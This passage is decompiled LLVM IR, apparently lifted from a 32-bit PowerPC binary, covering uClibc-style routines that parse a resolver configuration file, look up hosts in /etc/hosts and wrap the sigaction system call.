  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_1000e078 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_1000e078, i32* @r3, align 4
  %v0_1000e080 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r3.global-to-local, align 4
  %v0_1000e088 = call i32 @__pthread_return_0()
  store i32 %v0_1000e088, i32* %r3.global-to-local, align 4
  %v3_1000e090 = load i32, i32* @global_var_10024a8c.604, align 4
  %v2_1000e094 = icmp sgt i32 %v3_1000e090, 0
  br i1 %v2_1000e094, label %dec_label_pc_1000e30c, label %dec_label_pc_1000e09c

dec_label_pc_1000e09c:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_100138b8.665 to i32), i32* %r3.global-to-local, align 4
  store i32 268492980, i32* @lr, align 4
  %v3_1000e0b0 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_100138b8.665 to i32), i32 ptrtoint (i32* @global_var_100138cc.664 to i32))
  store i32 %v3_1000e0b0, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e0b0, i32* @r26, align 4
  %v3_1000e0b4 = icmp eq i32 %v3_1000e0b0, 0
  br i1 %v3_1000e0b4, label %dec_label_pc_1000e0bc, label %dec_label_pc_1000e2d0.preheader

dec_label_pc_1000e0bc:                            ; preds = %dec_label_pc_1000e09c
  %v0_1000e0c0 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_100138d0.666 to i32), i32* %r3.global-to-local, align 4
  store i32 268493004, i32* @lr, align 4
  %v3_1000e0c8 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_100138d0.666 to i32), i32 %v0_1000e0c0)
  store i32 %v3_1000e0c8, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e0c8, i32* @r26, align 4
  %v3_1000e0cc = icmp eq i32 %v3_1000e0c8, 0
  br i1 %v3_1000e0cc, label %dec_label_pc_1000e300, label %dec_label_pc_1000e2d0.preheader

dec_label_pc_1000e2d0.preheader:                  ; preds = %dec_label_pc_1000e09c, %dec_label_pc_1000e0bc
  %v0_1000e2dc16 = phi i32 [ %v3_1000e0b0, %dec_label_pc_1000e09c ], [ %v3_1000e0c8, %dec_label_pc_1000e0bc ]
  %v2_1000e2d0 = ptrtoint i32* %stack_var_-164 to i32
  %v1_1000e0dc2 = bitcast i32* %stack_var_-164 to i8*
  %v3_1000e1c0 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_1000e2d0

dec_label_pc_1000e0d8:                            ; preds = %dec_label_pc_1000e0f0
  %v1_1000e0d8 = add i32 %v0_1000e1989, 1
  store i32 %v1_1000e0d8, i32* %r3.global-to-local, align 4
  %v1_1000e0dc = inttoptr i32 %v1_1000e0d8 to i8*
  %v2_1000e0dc = load i8, i8* %v1_1000e0dc, align 1
  %v3_1000e0dc = zext i8 %v2_1000e0dc to i32
  store i32 %v3_1000e0dc, i32* %r11.global-to-local, align 4
  %v3_1000e0e4 = icmp eq i8 %v2_1000e0dc, 0
  br i1 %v3_1000e0e4, label %dec_label_pc_1000e2d0.backedge, label %dec_label_pc_1000e0f0

dec_label_pc_1000e0f0:                            ; preds = %dec_label_pc_1000e0f0.lr.ph, %dec_label_pc_1000e0d8
  %v0_1000e0f4.in = phi i32 [ %v3_1000e0dc4, %dec_label_pc_1000e0f0.lr.ph ], [ %v3_1000e0dc, %dec_label_pc_1000e0d8 ]
  %v0_1000e108 = phi i32 [ %v3_1000e0dc4, %dec_label_pc_1000e0f0.lr.ph ], [ %v3_1000e0dc, %dec_label_pc_1000e0d8 ]
  %v0_1000e1989 = phi i32 [ %v2_1000e2d0, %dec_label_pc_1000e0f0.lr.ph ], [ %v1_1000e0d8, %dec_label_pc_1000e0d8 ]
  %v0_1000e0f4 = mul nuw nsw i32 %v0_1000e0f4.in, 2
  %v2_1000e0f4 = add i32 %v0_1000e0f4, %v3_1000e0f0.pre
  %v3_1000e0f4 = inttoptr i32 %v2_1000e0f4 to i16*
  %v4_1000e0f4 = load i16, i16* %v3_1000e0f4, align 2
  %v1_1000e0f8 = and i16 %v4_1000e0f4, 32
  %v3_1000e0f8 = icmp eq i16 %v1_1000e0f8, 0
  br i1 %v3_1000e0f8, label %dec_label_pc_1000e100, label %dec_label_pc_1000e0d8

dec_label_pc_1000e100:                            ; preds = %dec_label_pc_1000e0f0
  %v3_1000e100 = icmp eq i32 %v0_1000e108, 10
  br i1 %v3_1000e100, label %dec_label_pc_1000e2d0.backedge, label %dec_label_pc_1000e108

dec_label_pc_1000e2d0.backedge:                   ; preds = %dec_label_pc_1000e0d8, %dec_label_pc_1000e284, %dec_label_pc_1000e28c, %dec_label_pc_1000e2c4, %dec_label_pc_1000e0dc.preheader, %dec_label_pc_1000e100, %dec_label_pc_1000e108, %dec_label_pc_1000e22c
  %v0_1000e2dc.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_1000e2d0

dec_label_pc_1000e108:                            ; preds = %dec_label_pc_1000e100
  %v3_1000e108 = icmp eq i32 %v0_1000e108, 35
  br i1 %v3_1000e108, label %dec_label_pc_1000e2d0.backedge, label %dec_label_pc_1000e110

dec_label_pc_1000e110:                            ; preds = %dec_label_pc_1000e108
  store i32 0, i32* @r27, align 4
  store i32 %v2_1000e078, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1000e19810 = inttoptr i32 %v0_1000e1989 to i8*
  %v2_1000e19811 = load i8, i8* %v1_1000e19810, align 1
  %v3_1000e19c14 = icmp eq i8 %v2_1000e19811, 0
  br i1 %v3_1000e19c14, label %dec_label_pc_1000e1ac, label %dec_label_pc_1000e1a4

dec_label_pc_1000e124:                            ; preds = %dec_label_pc_1000e1a4
  %v1_1000e124 = mul i32 %v0_1000e124, 4
  %v3_1000e128 = load i32, i32* @global_var_100249e8, align 4
  store i32 %v3_1000e128, i32* %r11.global-to-local, align 4
  %v1_1000e12c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000e12c = add i32 %v1_1000e12c, %v1_1000e124
  %v2_1000e130 = add i32 %v2_1000e12c, 16
  %v3_1000e130 = inttoptr i32 %v2_1000e130 to i32*
  store i32 %v0_1000e130, i32* %v3_1000e130, align 4
  %v0_1000e13c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e13c

dec_label_pc_1000e138:                            ; preds = %dec_label_pc_1000e150
  %v1_1000e138 = add i32 %v0_1000e138, 1
  store i32 %v1_1000e138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e13c

dec_label_pc_1000e13c:                            ; preds = %dec_label_pc_1000e124, %dec_label_pc_1000e138
  %v0_1000e138 = phi i32 [ %v0_1000e13c.pre, %dec_label_pc_1000e124 ], [ %v1_1000e138, %dec_label_pc_1000e138 ]
  %v1_1000e13c = inttoptr i32 %v0_1000e138 to i8*
  %v2_1000e13c = load i8, i8* %v1_1000e13c, align 1
  %v3_1000e140 = icmp eq i8 %v2_1000e13c, 0
  br i1 %v3_1000e140, label %dec_label_pc_1000e16c, label %dec_label_pc_1000e150

dec_label_pc_1000e150:                            ; preds = %dec_label_pc_1000e13c
  %v3_1000e148 = icmp eq i8 %v2_1000e13c, 10
  %v3_1000e13c = zext i8 %v2_1000e13c to i32
  %v1_1000e144 = mul nuw nsw i32 %v3_1000e13c, 2
  %v1_1000e150 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000e150 = add i32 %v1_1000e150, %v1_1000e144
  %v3_1000e150 = inttoptr i32 %v2_1000e150 to i16*
  %v4_1000e150 = load i16, i16* %v3_1000e150, align 2
  %v1_1000e154 = and i16 %v4_1000e150, 32
  %v3_1000e154.not = icmp ne i16 %v1_1000e154, 0
  %brmerge = or i1 %v3_1000e148, %v3_1000e154.not
  br i1 %brmerge, label %dec_label_pc_1000e16c, label %dec_label_pc_1000e138

dec_label_pc_1000e164:                            ; preds = %dec_label_pc_1000e180
  %v0_1000e164 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000e164 = trunc i32 %v0_1000e164 to i8
  store i8 %v1_1000e164, i8* %v1_1000e16c, align 1
  %v0_1000e168 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000e168 = add i32 %v0_1000e168, 1
  store i32 %v1_1000e168, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e16c

dec_label_pc_1000e16c:                            ; preds = %dec_label_pc_1000e150, %dec_label_pc_1000e13c, %dec_label_pc_1000e164
  %v0_1000e198 = phi i32 [ %v1_1000e168, %dec_label_pc_1000e164 ], [ %v0_1000e138, %dec_label_pc_1000e13c ], [ %v0_1000e138, %dec_label_pc_1000e150 ]
  %v1_1000e16c = inttoptr i32 %v0_1000e198 to i8*
  %v2_1000e16c = load i8, i8* %v1_1000e16c, align 1
  %v3_1000e16c = zext i8 %v2_1000e16c to i32
  %v3_1000e170 = icmp eq i8 %v2_1000e16c, 0
  %v1_1000e174 = mul nuw nsw i32 %v3_1000e16c, 2
  store i32 %v1_1000e174, i32* %r11.global-to-local, align 4
  br i1 %v3_1000e170, label %dec_label_pc_1000e194, label %dec_label_pc_1000e180

dec_label_pc_1000e180:                            ; preds = %dec_label_pc_1000e16c
  %v3_1000e178 = icmp eq i8 %v2_1000e16c, 10
  %v3_1000e180 = load i32, i32* @global_var_100249e8, align 4
  %v2_1000e184 = add i32 %v3_1000e180, %v1_1000e174
  %v3_1000e184 = inttoptr i32 %v2_1000e184 to i16*
  %v4_1000e184 = load i16, i16* %v3_1000e184, align 2
  %v1_1000e188 = and i16 %v4_1000e184, 32
  %v3_1000e188.not = icmp ne i16 %v1_1000e188, 0
  %brmerge27 = or i1 %v3_1000e178, %v3_1000e188.not
  br i1 %brmerge27, label %dec_label_pc_1000e164, label %dec_label_pc_1000e194

dec_label_pc_1000e194:                            ; preds = %dec_label_pc_1000e180, %dec_label_pc_1000e16c
  %v0_1000e194 = load i32, i32* @r27, align 4
  %v1_1000e194 = add i32 %v0_1000e194, 1
  store i32 %v1_1000e194, i32* @r27, align 4
  %v2_1000e198 = load i8, i8* %v1_1000e16c, align 1
  %v3_1000e19c = icmp eq i8 %v2_1000e198, 0
  br i1 %v3_1000e19c, label %dec_label_pc_1000e1ac, label %dec_label_pc_1000e1a4

dec_label_pc_1000e1a4:                            ; preds = %dec_label_pc_1000e110, %dec_label_pc_1000e194
  %v0_1000e130 = phi i32 [ %v0_1000e198, %dec_label_pc_1000e194 ], [ %v0_1000e1989, %dec_label_pc_1000e110 ]
  %v0_1000e124 = phi i32 [ %v1_1000e194, %dec_label_pc_1000e194 ], [ 0, %dec_label_pc_1000e110 ]
  %tmp33 = icmp slt i32 %v0_1000e124, 5
  br i1 %tmp33, label %dec_label_pc_1000e124, label %dec_label_pc_1000e1ac

dec_label_pc_1000e1ac:                            ; preds = %dec_label_pc_1000e194, %dec_label_pc_1000e1a4, %dec_label_pc_1000e110
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_100138e8.667 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_1000e1c0 = call i32 @__GI_strcoll(i8* %v3_1000e1c0, i32 ptrtoint ([11 x i8]* @global_var_100138e8.667 to i32))
  store i32 %v4_1000e1c0, i32* %r3.global-to-local, align 4
  %v3_1000e1c4 = icmp eq i32 %v4_1000e1c0, 0
  br i1 %v3_1000e1c4, label %dec_label_pc_1000e1f0, label %dec_label_pc_1000e214

dec_label_pc_1000e1d0:                            ; preds = %dec_label_pc_1000e208
  %v1_1000e1d0 = add i32 %v2_1000e1f8, 24
  %v2_1000e1d0 = inttoptr i32 %v1_1000e1d0 to i32*
  %v3_1000e1d0 = load i32, i32* %v2_1000e1d0, align 4
  store i32 %v3_1000e1d0, i32* %r3.global-to-local, align 4
  store i32 268493272, i32* @lr, align 4
  %v1_1000e1d4 = call i32 @__GI_strdup(i32 %v3_1000e1d0)
  store i32 %v1_1000e1d4, i32* %r3.global-to-local, align 4
  %v0_1000e1dc = load i32, i32* @r29, align 4
  %v1_1000e1dc = add i32 %v0_1000e1dc, 1
  store i32 %v1_1000e1dc, i32* %r11.global-to-local, align 4
  %v1_1000e1e0 = mul i32 %v0_1000e1dc, 4
  store i32 %v1_1000e1dc, i32* @global_var_10024a8c.604, align 4
  %v3_1000e1ec = add i32 %v1_1000e1e0, ptrtoint (i32* @global_var_1002ad88.605 to i32)
  %v4_1000e1ec = inttoptr i32 %v3_1000e1ec to i32*
  store i32 %v1_1000e1d4, i32* %v4_1000e1ec, align 4
  br label %dec_label_pc_1000e1f0

dec_label_pc_1000e1f0:                            ; preds = %dec_label_pc_1000e1ac, %dec_label_pc_1000e1d0
  %v0_1000e1f0 = load i32, i32* @r31, align 4
  %v1_1000e1f0 = load i32, i32* @r27, align 4
  %v2_1000e1f0 = icmp slt i32 %v0_1000e1f0, %v1_1000e1f0
  %v1_1000e1f4 = mul i32 %v0_1000e1f0, 4
  %v0_1000e1f8 = load i32, i32* @r1, align 4
  %v2_1000e1f8 = add i32 %v0_1000e1f8, %v1_1000e1f4
  br i1 %v2_1000e1f0, label %dec_label_pc_1000e208, label %dec_label_pc_1000e214

dec_label_pc_1000e208:                            ; preds = %dec_label_pc_1000e1f0
  %v3_1000e208 = load i32, i32* @global_var_10024a8c.604, align 4
  %tmp35 = icmp slt i32 %v3_1000e208, 3
  br i1 %tmp35, label %dec_label_pc_1000e1d0, label %dec_label_pc_1000e214

dec_label_pc_1000e214:                            ; preds = %dec_label_pc_1000e208, %dec_label_pc_1000e1f0, %dec_label_pc_1000e1ac
  %v0_1000e218 = load i32, i32* @r30, align 4
  store i32 %v0_1000e218, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100138f4.668 to i32), i32* @r4, align 4
  %v3_1000e220 = inttoptr i32 %v0_1000e218 to i8*
  %v4_1000e220 = call i32 @__GI_strcoll(i8* %v3_1000e220, i32 ptrtoint ([7 x i8]* @global_var_100138f4.668 to i32))
  store i32 %v4_1000e220, i32* %r3.global-to-local, align 4
  %v3_1000e224 = icmp eq i32 %v4_1000e220, 0
  br i1 %v3_1000e224, label %dec_label_pc_1000e264.preheader, label %dec_label_pc_1000e22c

dec_label_pc_1000e22c:                            ; preds = %dec_label_pc_1000e214
  %v0_1000e230 = load i32, i32* @r30, align 4
  store i32 %v0_1000e230, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_100138fc.669 to i32), i32* @r4, align 4
  %v3_1000e238 = inttoptr i32 %v0_1000e230 to i8*
  %v4_1000e238 = call i32 @__GI_strcoll(i8* %v3_1000e238, i32 ptrtoint ([7 x i8]* @global_var_100138fc.669 to i32))
  store i32 %v4_1000e238, i32* %r3.global-to-local, align 4
  %v3_1000e23c = icmp eq i32 %v4_1000e238, 0
  br i1 %v3_1000e23c, label %dec_label_pc_1000e264.preheader, label %dec_label_pc_1000e2d0.backedge

dec_label_pc_1000e264.preheader:                  ; preds = %dec_label_pc_1000e214, %dec_label_pc_1000e22c
  store i32 ptrtoint (i32* @global_var_1002ad78.656 to i32), i32* @r31, align 4
  %v3_1000e27041 = load i32, i32* @global_var_10024a90.654, align 4
  %v2_1000e27443 = icmp sgt i32 %v3_1000e27041, 0
  %v1_1000e27845 = add i32 %v3_1000e27041, -1
  %v1_1000e27c46 = mul i32 %v1_1000e27845, 4
  store i32 %v1_1000e27c46, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e27443, label %dec_label_pc_1000e248, label %dec_label_pc_1000e284

dec_label_pc_1000e248:                            ; preds = %dec_label_pc_1000e264.preheader, %dec_label_pc_1000e248
  %v1_1000e27c48 = phi i32 [ %v1_1000e27c, %dec_label_pc_1000e248 ], [ %v1_1000e27c46, %dec_label_pc_1000e264.preheader ]
  %v1_1000e27847 = phi i32 [ %v1_1000e278, %dec_label_pc_1000e248 ], [ %v1_1000e27845, %dec_label_pc_1000e264.preheader ]
  %v2_1000e248 = add i32 %v1_1000e27c48, ptrtoint (i32* @global_var_1002ad78.656 to i32)
  %v3_1000e248 = inttoptr i32 %v2_1000e248 to i32*
  %v4_1000e248 = load i32, i32* %v3_1000e248, align 4
  store i32 %v4_1000e248, i32* @r3, align 4
  store i32 %v1_1000e27847, i32* @global_var_10024a90.654, align 4
  store i32 268493396, i32* @lr, align 4
  %v0_1000e250 = call i32 @free()
  store i32 %v0_1000e250, i32* %r3.global-to-local, align 4
  %v3_1000e254 = load i32, i32* @global_var_10024a90.654, align 4
  %v1_1000e25c = mul i32 %v3_1000e254, 4
  %v1_1000e260 = load i32, i32* @r31, align 4
  %v3_1000e260 = add i32 %v1_1000e260, %v1_1000e25c
  %v4_1000e260 = inttoptr i32 %v3_1000e260 to i32*
  store i32 0, i32* %v4_1000e260, align 4
  store i32 ptrtoint (i32* @global_var_1002ad78.656 to i32), i32* @r31, align 4
  %v3_1000e270 = load i32, i32* @global_var_10024a90.654, align 4
  %v2_1000e274 = icmp sgt i32 %v3_1000e270, 0
  %v1_1000e278 = add i32 %v3_1000e270, -1
  %v1_1000e27c = mul i32 %v1_1000e278, 4
  store i32 %v1_1000e27c, i32* %r11.global-to-local, align 4
  br i1 %v2_1000e274, label %dec_label_pc_1000e248, label %dec_label_pc_1000e284

dec_label_pc_1000e284:                            ; preds = %dec_label_pc_1000e248, %dec_label_pc_1000e264.preheader
  %v3_1000e2c459 = phi i32 [ %v3_1000e27041, %dec_label_pc_1000e264.preheader ], [ %v3_1000e270, %dec_label_pc_1000e248 ]
  %v1_1000e2ac49 = load i32, i32* @r27, align 4
  %v2_1000e2ac50 = icmp sgt i32 %v1_1000e2ac49, 1
  %v0_1000e2b453 = load i32, i32* @r1, align 4
  %v2_1000e2b454 = add i32 %v0_1000e2b453, 4
  br i1 %v2_1000e2ac50, label %dec_label_pc_1000e2c4, label %dec_label_pc_1000e2d0.backedge

dec_label_pc_1000e28c:                            ; preds = %dec_label_pc_1000e2c4
  %v1_1000e28c = add i32 %v2_1000e2b455, 24
  %v2_1000e28c = inttoptr i32 %v1_1000e28c to i32*
  %v3_1000e28c = load i32, i32* %v2_1000e28c, align 4
  store i32 %v3_1000e28c, i32* %r3.global-to-local, align 4
  store i32 268493460, i32* @lr, align 4
  %v1_1000e290 = call i32 @__GI_strdup(i32 %v3_1000e28c)
  store i32 %v1_1000e290, i32* %r3.global-to-local, align 4
  %v0_1000e298 = load i32, i32* @r29, align 4
  %v1_1000e298 = add i32 %v0_1000e298, 1
  store i32 %v1_1000e298, i32* %r11.global-to-local, align 4
  %v1_1000e29c = mul i32 %v0_1000e298, 4
  store i32 %v1_1000e298, i32* @global_var_10024a90.654, align 4
  %v3_1000e2a8 = add i32 %v1_1000e29c, ptrtoint (i32* @global_var_1002ad78.656 to i32)
  %v4_1000e2a8 = inttoptr i32 %v3_1000e2a8 to i32*
  store i32 %v1_1000e290, i32* %v4_1000e2a8, align 4
  %v0_1000e2ac.pre = load i32, i32* @r31, align 4
  %v1_1000e2ac = load i32, i32* @r27, align 4
  %v2_1000e2ac = icmp slt i32 %v0_1000e2ac.pre, %v1_1000e2ac
  br i1 %v2_1000e2ac, label %dec_label_pc_1000e28c.dec_label_pc_1000e2c4_crit_edge, label %dec_label_pc_1000e2d0.backedge

dec_label_pc_1000e28c.dec_label_pc_1000e2c4_crit_edge: ; preds = %dec_label_pc_1000e28c
  %v0_1000e2b4 = load i32, i32* @r1, align 4
  %v1_1000e2b0 = mul i32 %v0_1000e2ac.pre, 4
  %v2_1000e2b4 = add i32 %v0_1000e2b4, %v1_1000e2b0
  %v3_1000e2c4.pre = load i32, i32* @global_var_10024a90.654, align 4
  br label %dec_label_pc_1000e2c4

dec_label_pc_1000e2c4:                            ; preds = %dec_label_pc_1000e284, %dec_label_pc_1000e28c.dec_label_pc_1000e2c4_crit_edge
  %v3_1000e2c4 = phi i32 [ %v3_1000e2c4.pre, %dec_label_pc_1000e28c.dec_label_pc_1000e2c4_crit_edge ], [ %v3_1000e2c459, %dec_label_pc_1000e284 ]
  %v2_1000e2b455 = phi i32 [ %v2_1000e2b4, %dec_label_pc_1000e28c.dec_label_pc_1000e2c4_crit_edge ], [ %v2_1000e2b454, %dec_label_pc_1000e284 ]
  %tmp37 = icmp slt i32 %v3_1000e2c4, 4
  br i1 %tmp37, label %dec_label_pc_1000e28c, label %dec_label_pc_1000e2d0.backedge

dec_label_pc_1000e2d0:                            ; preds = %dec_label_pc_1000e2d0.backedge, %dec_label_pc_1000e2d0.preheader
  %v0_1000e2dc = phi i32 [ %v0_1000e2dc.pre, %dec_label_pc_1000e2d0.backedge ], [ %v0_1000e2dc16, %dec_label_pc_1000e2d0.preheader ]
  store i32 %v2_1000e2d0, i32* %r3.global-to-local, align 4
  store i32 268493540, i32* @lr, align 4
  %v3_1000e2e0 = call i32 @fgets(i32 %v2_1000e2d0, i32 128, i32 %v0_1000e2dc)
  store i32 %v3_1000e2e0, i32* %r3.global-to-local, align 4
  %v3_1000e2e4 = icmp eq i32 %v3_1000e2e0, 0
  br i1 %v3_1000e2e4, label %dec_label_pc_1000e2f4, label %dec_label_pc_1000e0dc.preheader

dec_label_pc_1000e0dc.preheader:                  ; preds = %dec_label_pc_1000e2d0
  store i32 %v2_1000e2d0, i32* %r3.global-to-local, align 4
  %v2_1000e0dc3 = load i8, i8* %v1_1000e0dc2, align 4
  %v3_1000e0dc4 = zext i8 %v2_1000e0dc3 to i32
  store i32 %v3_1000e0dc4, i32* %r11.global-to-local, align 4
  %v3_1000e0e46 = icmp eq i8 %v2_1000e0dc3, 0
  br i1 %v3_1000e0e46, label %dec_label_pc_1000e2d0.backedge, label %dec_label_pc_1000e0f0.lr.ph

dec_label_pc_1000e0f0.lr.ph:                      ; preds = %dec_label_pc_1000e0dc.preheader
  %v3_1000e0f0.pre = load i32, i32* @global_var_100249e8, align 4
  br label %dec_label_pc_1000e0f0

dec_label_pc_1000e2f4:                            ; preds = %dec_label_pc_1000e2d0
  %v0_1000e2f4 = load i32, i32* @r26, align 4
  store i32 %v0_1000e2f4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e2fc.670 to i32), i32* @lr, align 4
  %v1_1000e2f8 = inttoptr i32 %v0_1000e2f4 to i16*
  %v2_1000e2f8 = call i32 @__GI_fclose(i16* %v1_1000e2f8)
  store i32 %v2_1000e2f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e30c

dec_label_pc_1000e300:                            ; preds = %dec_label_pc_1000e0bc
  %v0_1000e300 = call i32 @__GI___h_errno_location()
  store i32 %v0_1000e300, i32* %r3.global-to-local, align 4
  %v2_1000e308 = inttoptr i32 %v0_1000e300 to i32*
  store i32 3, i32* %v2_1000e308, align 4
  br label %dec_label_pc_1000e30c

dec_label_pc_1000e30c:                            ; preds = %entry, %dec_label_pc_1000e2f4, %dec_label_pc_1000e300
  store i32 %v2_1000e078, i32* @r3, align 4
  %v0_1000e314 = call i32 @__pthread_return_void()
  store i32 %v0_1000e314, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e314

; uselistorder directives
  uselistorder i32 %v3_1000e0dc4, { 2, 0, 1 }
  uselistorder i32 %v1_1000e27c46, { 1, 0 }
  uselistorder i32 %v1_1000e27845, { 1, 0 }
  uselistorder i32 %v0_1000e124, { 1, 0 }
  uselistorder i32 %v1_1000e174, { 1, 0 }
  uselistorder i8* %v1_1000e16c, { 0, 2, 1 }
  uselistorder i8 %v2_1000e13c, { 2, 0, 1 }
  uselistorder i32 %v0_1000e138, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000e0dc, { 1, 0, 2 }
  uselistorder i32 %v1_1000e0d8, { 0, 2, 1 }
  uselistorder i32 %v2_1000e2d0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000e078, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 20, 21, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 8, 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 17, 14, 13, 12, 11, 10, 9, 8, 23, 22, 1, 7, 6, 5, 4, 16, 15, 18, 21, 20, 19, 3, 2, 0 }
  uselistorder i32* @global_var_10024a90.654, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ad78.656 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ad88.605 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100249a8.603 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000e30c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e2c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e248, { 1, 0 }
  uselistorder label %dec_label_pc_1000e264.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e1a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e16c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e13c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2d0.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000e2d0.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1000e330 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268493680, i32* @lr, align 4
  %v9_1000e36c = inttoptr i32 %arg3 to i32*
  %v10_1000e36c = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000e36c, i32 %arg4, i32 %arg5, i32 %v4_1000e330, i32 %arg7)
  ret i32 %v10_1000e36c
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000e388 = load i32, i32* @lr, align 4
  store i32 %v0_1000e388, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e394 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000e3a4 = add i32 %tmp, 4
  store i32 %v1_1000e3a4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000e3ac = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000e3ac, i32* @r3, align 4
  br i1 %v3_1000e394, label %dec_label_pc_1000e3d4, label %dec_label_pc_1000e3b4

dec_label_pc_1000e3b4:                            ; preds = %entry
  %v2_1000e3b4 = load i32, i32* %arg2, align 4
  store i32 %v2_1000e3b4, i32* %r0.global-to-local, align 4
  store i32 268493760, i32* @lr, align 4
  %v0_1000e3bc = call i32 @memcpy()
  %v0_1000e3c0 = load i32, i32* @r31, align 4
  %v1_1000e3c0 = add i32 %v0_1000e3c0, 132
  %v2_1000e3c0 = inttoptr i32 %v1_1000e3c0 to i32*
  %v3_1000e3c0 = load i32, i32* %v2_1000e3c0, align 4
  store i32 %v3_1000e3c0, i32* %r0.global-to-local, align 4
  %v1_1000e3cc = add i32 %v0_1000e3c0, 136
  %v2_1000e3cc = inttoptr i32 %v1_1000e3cc to i32*
  %v3_1000e3cc = load i32, i32* %v2_1000e3cc, align 4
  store i32 %v3_1000e3cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e3d4

dec_label_pc_1000e3d4:                            ; preds = %entry, %dec_label_pc_1000e3b4
  store i32 268493812, i32* @lr, align 4
  %v0_1000e3f0 = call i32 @__syscall_rt_sigaction()
  %v0_1000e3f4 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000e3f4 = icmp eq i32 %v0_1000e3f4, 0
  store i32 %v0_1000e3f0, i32* @r31, align 4
  br i1 %v3_1000e3f4, label %dec_label_pc_1000e430, label %dec_label_pc_1000e404

dec_label_pc_1000e404:                            ; preds = %dec_label_pc_1000e3d4
  %v1_1000e3fc = icmp slt i32 %v0_1000e3f0, 0
  %v1_1000e404 = add i32 %v0_1000e3f4, 4
  store i32 %v1_1000e404, i32* @r3, align 4
  %v2_1000e408 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000e408, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000e3fc, label %dec_label_pc_1000e430, label %dec_label_pc_1000e414

dec_label_pc_1000e414:                            ; preds = %dec_label_pc_1000e404
  %v3_1000e414 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000e414, i32* %r0.global-to-local, align 4
  %v2_1000e418 = inttoptr i32 %v0_1000e3f4 to i32*
  store i32 %v3_1000e414, i32* %v2_1000e418, align 4
  store i32 268493856, i32* @lr, align 4
  %v0_1000e41c = call i32 @memcpy()
  %v1_1000e428 = load i32, i32* %r30.global-to-local, align 4
